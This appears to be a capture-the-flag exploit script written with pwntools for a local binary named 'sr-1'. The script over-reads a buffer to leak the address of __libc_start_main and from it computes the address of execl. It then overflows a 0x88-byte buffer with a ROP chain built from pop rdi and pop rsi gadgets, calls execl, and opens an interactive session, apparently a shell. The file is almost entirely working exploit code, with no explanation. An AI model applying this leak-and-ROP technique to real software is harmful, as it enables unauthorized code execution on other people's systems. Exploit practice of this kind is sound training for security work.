#!/usr/bin/env python

from pwn import *

offset_to_libc_start_main = 0xe8 - 0x30

p = process("./sr-1")
#gdb.attach(p, "b *input_func+110")

print(p.recv())

p.sendline(str(offset_to_libc_start_main+8))

data = p.recv()

print(repr(data))

libc_start_main = u64(data[offset_to_libc_start_main:offset_to_libc_start_main+8])

print(hex(libc_start_main))

"""
0x7ffff7a2d830 (__libc_start_main+240)
0x7ffff7ad9a20 <__GI_execl>
"""

execl = libc_start_main + 0x7ffff7ad9a20 - 0x7ffff7a2d830

print(hex(execl))

"""
0x400020:       "@"
0x0000000000400783 : pop rdi ; ret
0x0000000000400781 : pop rsi ; pop r15 ; ret
"""
pop_rdi_ret = 0x400783
pop_rsi_r15_ret = 0x400781
buf = "A" * 0x88
buf += p64(pop_rdi_ret)
buf += p64(0x400020)
buf += p64(pop_rsi_r15_ret)
buf += p64(0)
buf += p64(0)
buf += p64(execl)

p.sendline(buf)

p.interactive()
